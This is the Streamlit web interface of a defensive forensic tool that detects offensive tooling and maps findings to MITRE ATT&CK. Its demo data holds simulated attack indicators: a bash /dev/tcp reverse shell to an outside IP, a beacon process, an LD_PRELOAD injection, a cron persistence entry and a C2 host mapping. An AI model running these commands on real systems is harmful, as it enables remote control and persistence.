"""
app.py  –  PMGP Streamlit Web Interface
Run with:  streamlit run app.py
"""

import os
import sys

import streamlit as st

import time as _time
import json as _json
from pathlib import Path as _Path

sys.path.insert(0, os.path.dirname(__file__))

from pipeline import PipelineConfig, run_pipeline, PipelineResult
from modules.risk_classifier import RISK_COLOURS

# ── Remote mode constants & session state (must be before any st.stop()) ──────
_STATE_FILE    = _Path("remote_results/latest.json")
_POLL_INTERVAL = 2

def _load_remote_state():
    if not _STATE_FILE.exists():
        return None
    try:
        return _json.loads(_STATE_FILE.read_text())
    except Exception:
        return None

st.set_page_config(
    page_title="PMGP – Forensic Inspector",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="expanded",
)

RISK_EMOJI = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "🔵"}

# Initialise remote session state early so welcome-block condition can read it
if "remote_listening" not in st.session_state:
    st.session_state.remote_listening  = False
if "remote_wait_start" not in st.session_state:
    st.session_state.remote_wait_start = None
if "remote_last_ts" not in st.session_state:
    st.session_state.remote_last_ts    = None

st.markdown("""
<style>
/* ── Base & fonts ── */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');

html, body, [class*="css"] {
    font-family: 'Inter', sans-serif;
}

/* ── Sidebar ── */
[data-testid="stSidebar"] {
    background: linear-gradient(180deg, #0a0e27 0%, #0d1235 60%, #0a1628 100%);
    border-right: 1px solid rgba(99,179,237,0.15);
}
[data-testid="stSidebar"] * { color: #e2e8f0 !important; }
[data-testid="stSidebar"] .stRadio label {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 8px;
    padding: 0.4rem 0.7rem;
    margin-bottom: 4px;
    transition: all 0.2s;
}
[data-testid="stSidebar"] .stRadio label:hover {
    background: rgba(99,179,237,0.12);
    border-color: rgba(99,179,237,0.3);
}
[data-testid="stSidebar"] .stButton button {
    background: linear-gradient(135deg, #1e40af, #1d4ed8) !important;
    border: none !important;
    border-radius: 10px !important;
    color: white !important;
    font-weight: 600 !important;
    letter-spacing: 0.5px;
    transition: all 0.2s !important;
    box-shadow: 0 4px 15px rgba(29,78,216,0.4) !important;
}
[data-testid="stSidebar"] .stButton button:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(29,78,216,0.6) !important;
}

/* ── Main background ── */
.stApp { background: #060b18; }
.main .block-container { padding-top: 1.5rem; }

/* ── Hide default streamlit elements ── */
#MainMenu, footer, header { visibility: hidden; }

/* ── Risk banner ── */
.risk-banner {
    padding: 1.2rem 2rem;
    border-radius: 14px;
    color: white;
    font-size: 1.5rem;
    font-weight: 700;
    text-align: center;
    margin-bottom: 1.2rem;
    letter-spacing: 0.5px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
    position: relative;
    overflow: hidden;
}
.risk-banner::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 60%);
    pointer-events: none;
}

/* ── Kill chain banner ── */
.killchain-banner {
    background: rgba(220,38,38,0.12);
    border-left: 3px solid #ef4444;
    border-radius: 0 10px 10px 0;
    padding: 0.65rem 1.1rem;
    margin-bottom: 0.5rem;
    color: #fca5a5;
    font-weight: 500;
    font-size: 0.92rem;
}

/* ── MITRE tag ── */
.mitre-tag {
    display: inline-block;
    padding: 3px 10px;
    border-radius: 20px;
    background: rgba(99,179,237,0.12);
    color: #63b3ed;
    border: 1px solid rgba(99,179,237,0.25);
    font-size: 0.75rem;
    font-weight: 600;
    margin: 2px;
    font-family: 'JetBrains Mono', monospace;
}

/* ── Metric cards ── */
[data-testid="metric-container"] {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 12px;
    padding: 1rem;
    transition: all 0.2s;
}
[data-testid="metric-container"]:hover {
    border-color: rgba(99,179,237,0.3);
    background: rgba(99,179,237,0.06);
}
[data-testid="metric-container"] [data-testid="stMetricLabel"] {
    color: #94a3b8 !important;
    font-size: 0.75rem !important;
    font-weight: 600 !important;
    letter-spacing: 0.8px !important;
    text-transform: uppercase !important;
}
[data-testid="metric-container"] [data-testid="stMetricValue"] {
    color: #f1f5f9 !important;
    font-size: 1.6rem !important;
    font-weight: 700 !important;
}

/* ── Tabs ── */
[data-testid="stTabs"] [role="tablist"] {
    background: rgba(255,255,255,0.03);
    border-radius: 12px;
    padding: 4px;
    border: 1px solid rgba(255,255,255,0.06);
    gap: 2px;
}
[data-testid="stTabs"] [role="tab"] {
    border-radius: 8px !important;
    color: #94a3b8 !important;
    font-weight: 500 !important;
    font-size: 0.82rem !important;
    padding: 0.4rem 0.8rem !important;
    transition: all 0.2s !important;
}
[data-testid="stTabs"] [role="tab"]:hover {
    color: #e2e8f0 !important;
    background: rgba(255,255,255,0.06) !important;
}
[data-testid="stTabs"] [role="tab"][aria-selected="true"] {
    background: rgba(99,179,237,0.15) !important;
    color: #63b3ed !important;
    font-weight: 600 !important;
}
[data-testid="stTabs"] [role="tabpanel"] {
    padding-top: 1rem;
}

/* ── Expanders ── */
[data-testid="stExpander"] {
    background: rgba(255,255,255,0.03) !important;
    border: 1px solid rgba(255,255,255,0.07) !important;
    border-radius: 10px !important;
    margin-bottom: 0.5rem;
    transition: all 0.2s;
}
[data-testid="stExpander"]:hover {
    border-color: rgba(99,179,237,0.2) !important;
    background: rgba(99,179,237,0.04) !important;
}
[data-testid="stExpander"] summary {
    color: #cbd5e1 !important;
    font-weight: 500 !important;
}

/* ── Code blocks ── */
[data-testid="stCode"] {
    background: rgba(0,0,0,0.4) !important;
    border: 1px solid rgba(255,255,255,0.08) !important;
    border-radius: 8px !important;
    font-family: 'JetBrains Mono', monospace !important;
}

/* ── Dataframes ── */
[data-testid="stDataFrame"] {
    border-radius: 10px;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.08);
}

/* ── Info/warning/error/success boxes ── */
[data-testid="stAlert"] {
    border-radius: 10px !important;
    border: none !important;
}

/* ── Divider ── */
hr {
    border-color: rgba(255,255,255,0.08) !important;
    margin: 1rem 0 !important;
}

/* ── Scrollbar ── */
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: #0a0e27; }
::-webkit-scrollbar-thumb { background: rgba(99,179,237,0.3); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: rgba(99,179,237,0.5); }

/* ── Risk item cards ── */
.risk-item-card {
    border-radius: 10px;
    color: #f1f5f9;
    padding: 0.7rem 1rem;
    margin-bottom: 0.5rem;
    transition: all 0.15s;
}
.risk-item-card:hover { filter: brightness(1.06); }

/* ── Welcome cards ── */
.welcome-card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 14px;
    padding: 1.4rem;
    text-align: center;
    transition: all 0.2s;
    height: 100%;
}
.welcome-card:hover {
    border-color: rgba(99,179,237,0.3);
    background: rgba(99,179,237,0.06);
    transform: translateY(-2px);
}
.welcome-card-icon { font-size: 2rem; margin-bottom: 0.5rem; }
.welcome-card-title {
    color: #f1f5f9;
    font-weight: 700;
    font-size: 0.95rem;
    margin-bottom: 0.3rem;
}
.welcome-card-desc { color: #94a3b8; font-size: 0.82rem; line-height: 1.5; }

/* ── Section headers ── */
.section-header {
    color: #63b3ed;
    font-size: 1.3rem;
    font-weight: 700;
    margin-bottom: 1rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid rgba(99,179,237,0.2);
    letter-spacing: 0.3px;
}

/* ── Tool row cards ── */
.tool-card {
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 10px;
    padding: 0.7rem 1rem;
    margin-bottom: 0.4rem;
    display: flex;
    align-items: center;
    gap: 1rem;
    transition: all 0.15s;
}
.tool-card:hover {
    border-color: rgba(99,179,237,0.25);
    background: rgba(99,179,237,0.05);
}

/* ── Host badge ── */
.host-badge {
    display: inline-block;
    background: rgba(255,255,255,0.15);
    color: white;
    padding: 0.15rem 0.7rem;
    border-radius: 20px;
    font-weight: 700;
    font-size: 0.88rem;
}

/* ── Waiting card ── */
.waiting-card {
    background: linear-gradient(135deg, #0f1f5c 0%, #0d1b4b 100%);
    border: 1px solid rgba(99,179,237,0.2);
    border-radius: 18px;
    padding: 3rem 2rem;
    text-align: center;
    color: white;
    margin: 1.5rem auto;
    max-width: 600px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}
.waiting-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
.waiting-sub   { opacity: 0.65; margin-bottom: 1.8rem; font-size: 0.92rem; line-height: 1.6; }
.step-row {
    display: flex; align-items: center; gap: 12px;
    background: rgba(255,255,255,0.06);
    border-radius: 9px;
    padding: 0.55rem 0.9rem;
    margin-bottom: 0.4rem;
    font-size: 0.9rem; text-align: left;
    border: 1px solid rgba(255,255,255,0.06);
}
.spulse { color: #fde68a; font-weight: 600; }
.swait  { color: rgba(255,255,255,0.3); }
.sdone  { color: #6ee7b7; }
.rtimer {
    display: inline-block;
    background: rgba(99,179,237,0.15);
    border: 1px solid rgba(99,179,237,0.25);
    border-radius: 20px;
    padding: 0.3rem 1.2rem;
    font-size: 0.88rem;
    margin-top: 1.2rem;
    color: #93c5fd;
    letter-spacing: 1px;
    font-family: 'JetBrains Mono', monospace;
}
</style>
""", unsafe_allow_html=True)


# ── Demo data factory ─────────────────────────────────────────────────────────
def _run_demo() -> PipelineResult:
    from modules.os_profiler import OSProfile, OSType, FilesystemArtefact
    from modules.tool_detector import ToolDetectionResult, DetectedTool
    from modules.live_analyzer import LiveAnalysisResult, ProcessFinding, NetworkConnection
    from modules.disk_analyzer import DiskAnalysisResult, PartitionEntry
    from modules.risk_classifier import classify_risk
    from modules.report_generator import generate_json_report, generate_html_report

    os_profile = OSProfile(
        os_type=OSType.KALI_LINUX,
        confidence=0.96,
        indicators=[
            "Kali metapackages found: kali-linux-default, kali-linux-core",
            "Kali repository URL found in apt sources",
            "Kali official GPG signing key detected",
            "'Kali' found in /etc/os-release",
            "Offensive commands in root/.bash_history: nmap, msfconsole, hydra",
        ],
        pkg_db_path="/var/lib/dpkg/status",
        pkg_db_type="dpkg",
        filesystem_artefacts=[
            FilesystemArtefact(
                path="root/.bash_history",
                artefact_type="shell_history",
                description="Shell history contains 47 offensive tool invocations: nmap, msfconsole, hydra, sqlmap, proxychains",
                risk_level="HIGH",
                snippet="nmap -sS -p 1-65535 192.168.1.0/24",
            ),
            FilesystemArtefact(
                path="root/.ssh/known_hosts",
                artefact_type="ssh_key",
                description="SSH known_hosts with 12 host(s) – lateral movement evidence",
                risk_level="MEDIUM",
                snippet="192.168.10.5 ssh-rsa AAAAB3NzaC1yc2EA...",
            ),
            FilesystemArtefact(
                path="root/.ssh/id_rsa",
                artefact_type="ssh_key",
                description="Private SSH key found in root home directory",
                risk_level="HIGH",
                snippet="",
            ),
            FilesystemArtefact(
                path="etc/cron.d/update-check",
                artefact_type="cron",
                description="Cron job file with 1 active entry – potential persistence",
                risk_level="MEDIUM",
                snippet="*/5 * * * * root /tmp/.hidden/beacon.sh",
            ),
            FilesystemArtefact(
                path="etc/hosts",
                artefact_type="hosts_mod",
                description="/etc/hosts has 3 custom entries – possible C2 infrastructure mapping",
                risk_level="MEDIUM",
                snippet="10.0.0.99   c2.evil.internal",
            ),
        ],
    )

    demo_tools = [
        DetectedTool("metasploit", "high_risk", "metasploit-framework",
                     "Exploitation framework", "T1210 - Exploitation of Remote Services",
                     "Exploitation", "package_db"),
        DetectedTool("sqlmap", "high_risk", "sqlmap",
                     "Automated SQL injection tool", "T1190 - Exploit Public-Facing Application",
                     "Exploitation", "package_db"),
        DetectedTool("john", "high_risk", "john",
                     "Password cracking tool", "T1110 - Brute Force",
                     "Credential Access", "package_db"),
        DetectedTool("hashcat", "high_risk", "hashcat",
                     "Advanced password recovery", "T1110.002 - Password Cracking",
                     "Credential Access", "package_db"),
        DetectedTool("hydra", "high_risk", "hydra",
                     "Network login cracker", "T1110.001 - Password Guessing",
                     "Credential Access", "package_db"),
        DetectedTool("impacket", "dual_use", "/opt/impacket/examples/secretsdump.py",
                     "Network protocols toolkit [filesystem path]",
                     "T1550 - Use Alternate Authentication Material",
                     "Lateral Movement", "filesystem"),
        DetectedTool("nmap", "dual_use", "nmap",
                     "Network mapper and port scanner", "T1046 - Network Service Discovery",
                     "Discovery", "package_db"),
        DetectedTool("gobuster", "dual_use", "gobuster",
                     "Directory/DNS brute forcer", "T1595.003 - Wordlist Scanning",
                     "Reconnaissance", "package_db"),
        DetectedTool("nikto", "dual_use", "nikto",
                     "Web server vulnerability scanner", "T1595 - Active Scanning",
                     "Reconnaissance", "package_db"),
        DetectedTool("tor", "anonymization", "tor",
                     "Onion routing anonymizer", "T1090.003 - Multi-hop Proxy",
                     "Command and Control", "package_db"),
        DetectedTool("proxychains", "anonymization", "/etc/proxychains4.conf",
                     "TCP proxy chaining tool [config trace]", "T1090 - Proxy",
                     "Command and Control", "config"),
        DetectedTool("macchanger", "anonymization", "macchanger",
                     "MAC address spoofing", "T1036 - Masquerading",
                     "Defense Evasion", "package_db"),
    ]

    tool_result = ToolDetectionResult(
        detected_tools=demo_tools,
        total_packages_scanned=1842,
        raw_package_list=[t.matched_package for t in demo_tools],
        filesystem_hits=["/opt/impacket/examples/secretsdump.py"],
        config_hits=["/etc/proxychains4.conf", "/etc/tor/torrc"],
    )

    live_result = LiveAnalysisResult(
        is_live_system=True,
        total_processes_scanned=134,
        process_findings=[
            ProcessFinding(
                pid=4421, comm="python3",
                cmdline="python3 /tmp/.hidden/beacon.py --host 185.220.101.45 --port 4444",
                suspicious_vars={"LD_PRELOAD": "/tmp/.hidden/libevil.so"},
                cmdline_matches=[
                    ("nmap detected in process cmdline", "T1046", "Discovery"),
                ],
                notes=[
                    "LD_PRELOAD set – Shared library injection – may hijack execution flow",
                    "[T1046] nmap detected in process cmdline — python3 /tmp/.hidden/beacon.py",
                ],
            ),
            ProcessFinding(
                pid=1337, comm="bash",
                cmdline="bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
                attacker_ips={"SSH_CONNECTION": "185.220.101.45 41234 10.0.0.5 22"},
                notes=["Non-private IP in SSH_CONNECTION: 185.220.101.45 – potential attacker origin"],
            ),
            ProcessFinding(
                pid=8823, comm="nmap",
                cmdline="nmap -sS -p 1-65535 192.168.1.0/24 -oX /tmp/scan.xml",
                cmdline_matches=[
                    ("nmap detected in process cmdline", "T1046", "Discovery"),
                ],
                notes=["[T1046] nmap detected in process cmdline — nmap -sS -p 1-65535 192.168.1.0/24"],
            ),
        ],
        suspicious_connections=[
            NetworkConnection("10.0.0.5", 54321, "185.220.101.45", 4444, "ESTABLISHED", "tcp"),
            NetworkConnection("10.0.0.5", 43210, "198.96.155.3",   443,  "ESTABLISHED", "tcp"),
        ],
        network_connections=[
            NetworkConnection("10.0.0.5", 54321, "185.220.101.45", 4444, "ESTABLISHED", "tcp"),
            NetworkConnection("10.0.0.5", 43210, "198.96.155.3",   443,  "ESTABLISHED", "tcp"),
            NetworkConnection("127.0.0.1", 9050,  "0.0.0.0",       0,    "LISTEN",       "tcp"),
        ],
    )

    p1 = PartitionEntry(1, "21686148-...", "", 2048,      4095,       "BIOS boot",  1.0)
    p2 = PartitionEntry(2, "C12A7328-...", "", 4096,      1052671,    "EFI System", 512.0)
    p3 = PartitionEntry(3, "0FC63DAF-...", "", 1052672,   999999487,  "kali-root",  475000.0)
    p4 = PartitionEntry(4, "0FC63DAF-...", "", 999999488, 1000214527, "TailsData",  104.0,
                        has_luks_header=True, luks_version="LUKS2", risk_label="HIGH",
                        risk_note="LUKS2 encryption header detected")

    disk_result = DiskAnalysisResult(
        image_path="/demo/kali.img", has_gpt=True,
        partitions=[p1, p2, p3, p4], encrypted_partitions=[p4],
        tails_data_found=True,
        notes=["GPT partition table detected",
               "TailsData partition detected – Tails persistent storage",
               "Partition 4 ('TailsData'): LUKS header found (LUKS2)"],
    )

    risk_report = classify_risk(os_profile, tool_result, live_result, disk_result)
    
    # Overwrite time of attack for demo
    risk_report.time_of_attack = "2024-11-05 14:32:05 UTC (Demo Extracted)"

    json_rep = generate_json_report(os_profile, tool_result, risk_report, live_result, disk_result)
    html_rep = generate_html_report(os_profile, tool_result, risk_report, live_result, disk_result)

    r = PipelineResult()
    r.os_profile  = os_profile;  r.tool_result = tool_result
    r.live_result = live_result; r.disk_result = disk_result
    r.risk_report = risk_report
    r.json_report = json_rep;    r.html_report = html_rep
    r.elapsed_seconds = 0.31
    return r


# ── Sidebar ───────────────────────────────────────────────────────────────────
with st.sidebar:
    st.markdown("## 🔍 PMGP")
    st.markdown("**Passive Metadata-Graph Protocol**")
    st.markdown("---")
    st.markdown("### 📂 Target Configuration")

    analysis_mode = st.radio(
        "Analysis Mode",
        ["Live System (/)", "Custom Root Path", "Demo (simulated data)",
         "Remote (wait for collector)"],
        index=2,
    )
    root_path = "/"
    if analysis_mode == "Custom Root Path":
        root_path = st.text_input("Filesystem Root Path", placeholder="/mnt/evidence").strip().strip("\"'")
        import os
        if root_path and os.path.isfile(root_path):
            st.warning("⚠️ **Warning:** The Root Path must be a mounted directory, not a file (e.g., an `.iso` image). PMGP needs to read the extracted filesystem. (If you want to analyze a disk image for partitions, use 'Disk Image Analysis' below).")
    elif analysis_mode == "Live System (/)":
        root_path = "/"
        st.warning("Reads this machine's actual package database.")
    elif analysis_mode == "Remote (wait for collector)":
        st.info("Server listens on port 5000.\nRun collector on target machine.")
        st.code("bash system-health-check.sh", language="bash")

    if analysis_mode != "Remote (wait for collector)":
        st.markdown("### Pipeline Stages")
        run_live  = st.checkbox("Live /proc Analysis", value=(analysis_mode == "Live System (/)"))
        run_disk  = st.checkbox("Disk Image Analysis", value=False)
        disk_path = ""
        if run_disk:
            disk_path = st.text_input("Disk Image Path", placeholder="/path/to/image.img").strip().strip("\"'")
        save_reports = st.checkbox("Save Reports to Disk", value=False)
        output_dir   = "reports"
        if save_reports:
            output_dir = st.text_input("Output Directory", value="reports").strip().strip("\"'")
    else:
        run_live = False; run_disk = False; disk_path = ""
        save_reports = False; output_dir = "reports"

    st.markdown("---")
    if analysis_mode == "Remote (wait for collector)":
        run_btn = st.button("Start Listening", type="primary", use_container_width=True)
    else:
        run_btn = st.button("Run Analysis", type="primary", use_container_width=True)


# ── Title ─────────────────────────────────────────────────────────────────────
st.markdown("""
<div style='padding:1.5rem 0 0.5rem; border-bottom:1px solid rgba(99,179,237,0.15); margin-bottom:1.5rem;'>
  <div style='display:flex; align-items:center; gap:14px;'>
    <div style='background:linear-gradient(135deg,#1e40af,#0ea5e9);
                border-radius:12px; padding:10px 14px; font-size:1.6rem;
                box-shadow:0 4px 20px rgba(14,165,233,0.4);'>🔍</div>
    <div>
      <div style='font-size:1.7rem; font-weight:800; color:#f1f5f9; letter-spacing:-0.5px;
                  line-height:1.1;'>PMGP Forensic Inspector</div>
      <div style='font-size:0.78rem; color:#64748b; font-weight:500; letter-spacing:1px;
                  text-transform:uppercase; margin-top:2px;'>
        Passive Metadata-Graph Protocol v2.0 &nbsp;·&nbsp; Non-destructive &nbsp;·&nbsp; MITRE ATT&CK Mapped
      </div>
    </div>
  </div>
</div>
""", unsafe_allow_html=True)


# ── Welcome ───────────────────────────────────────────────────────────────────
if not run_btn and "last_result" not in st.session_state and not st.session_state.get("remote_listening"):
    st.markdown("""
<div style='display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; margin-bottom:2rem;'>
  <div class='welcome-card'>
    <div class='welcome-card-icon'>🖥</div>
    <div class='welcome-card-title'>OS Profiling</div>
    <div class='welcome-card-desc'>Identifies Kali, BlackArch, Tails without executing a single binary</div>
  </div>
  <div class='welcome-card'>
    <div class='welcome-card-icon'>🛠</div>
    <div class='welcome-card-title'>Tool Detection</div>
    <div class='welcome-card-desc'>3-pass scan: package DB, filesystem paths, and config file traces</div>
  </div>
  <div class='welcome-card'>
    <div class='welcome-card-icon'>⚔</div>
    <div class='welcome-card-title'>Kill Chain Inference</div>
    <div class='welcome-card-desc'>MITRE ATT&CK mapping with multi-stage attack pattern detection</div>
  </div>
  <div class='welcome-card'>
    <div class='welcome-card-icon'>📋</div>
    <div class='welcome-card-title'>Forensic Report</div>
    <div class='welcome-card-desc'>Court-ready JSON + self-contained HTML with full evidence trail</div>
  </div>
</div>
""", unsafe_allow_html=True)

    st.markdown("""
<div style='background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07);
            border-radius:14px; padding:1.5rem 2rem; margin-bottom:1.5rem;'>
  <div style='color:#63b3ed; font-weight:700; font-size:1rem; margin-bottom:1rem;
              letter-spacing:0.5px; text-transform:uppercase;'>How it works</div>
  <div style='display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; text-align:center;'>
    <div>
      <div style='background:rgba(99,179,237,0.1); border-radius:50%; width:36px; height:36px;
                  display:flex; align-items:center; justify-content:center; margin:0 auto 0.5rem;
                  color:#63b3ed; font-weight:800; font-size:1rem; border:1px solid rgba(99,179,237,0.25);'>1</div>
      <div style='color:#94a3b8; font-size:0.82rem; line-height:1.5;'>Configure target in sidebar</div>
    </div>
    <div>
      <div style='background:rgba(99,179,237,0.1); border-radius:50%; width:36px; height:36px;
                  display:flex; align-items:center; justify-content:center; margin:0 auto 0.5rem;
                  color:#63b3ed; font-weight:800; font-size:1rem; border:1px solid rgba(99,179,237,0.25);'>2</div>
      <div style='color:#94a3b8; font-size:0.82rem; line-height:1.5;'>Enable optional pipeline stages</div>
    </div>
    <div>
      <div style='background:rgba(99,179,237,0.1); border-radius:50%; width:36px; height:36px;
                  display:flex; align-items:center; justify-content:center; margin:0 auto 0.5rem;
                  color:#63b3ed; font-weight:800; font-size:1rem; border:1px solid rgba(99,179,237,0.25);'>3</div>
      <div style='color:#94a3b8; font-size:0.82rem; line-height:1.5;'>Run the full forensic pipeline</div>
    </div>
    <div>
      <div style='background:rgba(99,179,237,0.1); border-radius:50%; width:36px; height:36px;
                  display:flex; align-items:center; justify-content:center; margin:0 auto 0.5rem;
                  color:#63b3ed; font-weight:800; font-size:1rem; border:1px solid rgba(99,179,237,0.25);'>4</div>
      <div style='color:#94a3b8; font-size:0.82rem; line-height:1.5;'>Download JSON + HTML report</div>
    </div>
  </div>
</div>
""", unsafe_allow_html=True)

    st.markdown("""
<div style='background:rgba(234,179,8,0.07); border:1px solid rgba(234,179,8,0.2);
            border-radius:10px; padding:0.8rem 1.2rem; color:#fde68a; font-size:0.85rem;'>
  ⚠️ &nbsp;PMGP never executes binaries, modifies evidence, or decrypts data.
  All analysis is read-only metadata inspection. Forensically non-destructive.
</div>
""", unsafe_allow_html=True)
    st.stop()


# ── Run ───────────────────────────────────────────────────────────────────────
if run_btn:
    if analysis_mode == "Remote (wait for collector)":
        st.session_state.remote_listening  = True
        st.session_state.remote_wait_start = _time.time()
        st.session_state.remote_last_ts    = None
        # clear any old result so we wait for fresh data
        if _STATE_FILE.exists():
            _STATE_FILE.unlink()
        st.rerun()
    elif analysis_mode == "Demo (simulated data)":
        with st.spinner("Running PMGP demo pipeline…"):
            result = _run_demo()
        st.session_state["last_result"] = result
    else:
        pb     = st.progress(0)
        st_cap = st.empty()

        def _cb(msg: str, pct: int) -> None:
            pb.progress(pct); st_cap.caption(f"Running: {msg}")

        cfg = PipelineConfig(
            root_path=root_path or "/",
            run_live_analysis=run_live,
            disk_image_path=disk_path if run_disk and disk_path else None,
            output_dir=output_dir,
            save_json=save_reports,
            save_html=save_reports,
        )
        with st.spinner("Running PMGP forensic pipeline…"):
            result = run_pipeline(cfg, progress_callback=_cb)
        pb.empty(); st_cap.empty()
        st.session_state["last_result"] = result

# ══════════════════════════════════════════════════════════════════════════
# REMOTE WAITING / RESULTS SCREEN
# ══════════════════════════════════════════════════════════════════════════
if st.session_state.remote_listening:
    _remote_state = _load_remote_state()
    _status = _remote_state.get("status") if _remote_state else None

    SPINNERS = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    _elapsed = int(_time.time() - (st.session_state.remote_wait_start or _time.time()))
    _mins, _secs = divmod(_elapsed, 60)
    _timer = f"{_mins:02d}:{_secs:02d}"
    _spin  = SPINNERS[_elapsed % len(SPINNERS)]

    # ── Stop listening button in sidebar ─────────────────────────────────
    with st.sidebar:
        if st.button("⏹ Stop listening", use_container_width=True):
            st.session_state.remote_listening = False
            st.rerun()

    # ── WAITING: no data yet ─────────────────────────────────────────────
    if _remote_state is None or _status == "waiting":
        st.markdown("""
<style>
.remote-wait-card {
    background:#1a237e; border-radius:16px; padding:2.5rem 2rem;
    text-align:center; color:white; margin:1rem auto; max-width:580px;
}
.remote-wait-title { font-size:1.8rem; font-weight:700; margin-bottom:0.4rem; }
.remote-wait-sub   { opacity:0.75; margin-bottom:1.8rem; font-size:0.95rem; }
.rstep {
    display:flex; align-items:center; gap:10px;
    background:rgba(255,255,255,0.07); border-radius:8px;
    padding:0.55rem 0.9rem; margin-bottom:0.4rem; font-size:0.92rem; text-align:left;
}
.spulse { color:#fff176; }
.swait  { color:rgba(255,255,255,0.35); }
.rtimer {
    display:inline-block; background:rgba(255,255,255,0.12);
    border-radius:20px; padding:0.3rem 1rem; font-size:0.88rem; margin-top:1.2rem;
}
</style>""", unsafe_allow_html=True)

        step_defs = [
            ("📡", "Waiting for collector to connect", True),
            ("📦", "Receiving diagnostic bundle",       False),
            ("🔍", "Running OS profiler",              False),
            ("🛠",  "Scanning for offensive tools",    False),
            ("⚔",  "MITRE ATT&CK mapping",            False),
            ("📋", "Generating forensic report",        False),
        ]
        steps_html = ""
        for _icon, _label, _active in step_defs:
            _cls    = "spulse" if _active else "swait"
            _prefix = _spin if _active else "○"
            steps_html += (
                f"<div class='rstep'><span style='font-size:1rem'>{_icon}</span>"
                f"<span class='{_cls}'>{_prefix} {_label}</span></div>"
            )

        st.markdown(
            f"<div class='remote-wait-card'>"
            f"<div class='remote-wait-title'>🛰 Awaiting Target</div>"
            f"<div class='remote-wait-sub'>Run the collector script on the target machine.<br>"
            f"This screen updates automatically.</div>"
            f"{steps_html}"
            f"<div class='rtimer'>⏱ Waiting {_timer}</div>"
            f"</div>",
            unsafe_allow_html=True,
        )

        _c1, _c2, _c3 = st.columns(3)
        _c1.info(f"**Mode**\nRemote listener")
        _c2.info(f"**Port**\n5000")
        _c3.info(f"**Elapsed**\n{_timer}")

        _time.sleep(_POLL_INTERVAL)
        st.rerun()

    # ── PROCESSING: bundle received, analysis running ─────────────────────
    elif _status == "processing":
        _hostname = _remote_state.get("hostname", "unknown")
        _stage    = _remote_state.get("stage", "")
        steps = [
            ("📡", "Bundle received",         True),
            ("🔍", "Running OS profiler",     _stage == "os"),
            ("🛠",  "Scanning tools",         _stage == "tools"),
            ("⚙",  "Live process analysis",  _stage == "live"),
            ("⚔",  "MITRE ATT&CK mapping",   _stage == "risk"),
            ("📋", "Generating report",        _stage == "report"),
        ]
        steps_html = ""
        for _icon, _label, _active in steps:
            _cls    = "spulse" if _active else "swait"
            _prefix = _spin if _active else "✓"
            steps_html += (
                f"<div class='rstep'><span>{_icon}</span>"
                f"<span class='{_cls}'>{_prefix} {_label}</span></div>"
            )
        st.markdown(
            f"<div class='remote-wait-card' style='background:#0d47a1'>"
            f"<div class='remote-wait-title'>{_spin} Analysing {_hostname}</div>"
            f"<div class='remote-wait-sub'>Bundle received — running PMGP pipeline</div>"
            f"{steps_html}</div>",
            unsafe_allow_html=True,
        )
        _time.sleep(_POLL_INTERVAL)
        st.rerun()

    # ── ERROR ─────────────────────────────────────────────────────────────
    elif _status == "error":
        st.error(f"Analysis failed for **{_remote_state.get('hostname','unknown')}**")
        st.code(_remote_state.get("error", "Unknown error"))
        if st.button("🔄 Try again"):
            if _STATE_FILE.exists(): _STATE_FILE.unlink()
            st.rerun()

    # ── RESULTS READY ─────────────────────────────────────────────────────
    elif _status == "ready":
        _cur_ts = _remote_state.get("timestamp")
        if _cur_ts != st.session_state.remote_last_ts:
            st.session_state.remote_last_ts = _cur_ts

        _hostname    = _remote_state.get("hostname",     "unknown")
        _timestamp   = _remote_state.get("timestamp",   "")
        _risk_level  = _remote_state.get("overall_risk","INFO")
        _risk_score  = _remote_state.get("risk_score",  0)
        _os_type     = _remote_state.get("os_type",     "Unknown")
        _confidence  = _remote_state.get("confidence",  0)
        _tool_count  = _remote_state.get("tool_count",  0)
        _kill_chains = _remote_state.get("kill_chains", [])
        _summary     = _remote_state.get("summary",     [])
        _json_report = _remote_state.get("json_report", "")
        _html_report = _remote_state.get("html_report", "")
        _colour      = RISK_COLOURS.get(_risk_level, "#333")

        # Risk banner
        st.markdown(
            f"<div class='risk-banner' style='background:{_colour}'>"
            f"{RISK_EMOJI.get(_risk_level,'o')} {_risk_level} RISK — "
            f"Score: {_risk_score}/100 · "
            f"Host: <strong>{_hostname}</strong> · {_timestamp}</div>",
            unsafe_allow_html=True,
        )

        for _chain in _kill_chains:
            st.markdown(
                f"<div class='killchain-banner'>⚔ <strong>Kill chain:</strong> {_chain}</div>",
                unsafe_allow_html=True,
            )

        _m1, _m2, _m3, _m4 = st.columns(4)
        _m1.metric("Target Host", _hostname)
        _m2.metric("OS Detected", _os_type.split(" ")[0])
        _m3.metric("Confidence",  f"{int(_confidence*100)}%")
        _m4.metric("Tools Found", _tool_count)

        st.markdown("---")

        _parsed = {}
        if _json_report:
            try: _parsed = _json.loads(_json_report)
            except Exception: pass

        _risk_items     = _parsed.get("risk_items", [])
        _mitre_coverage = _parsed.get("mitre_coverage", [])
        _detected_tools = _parsed.get("detected_tools", [])
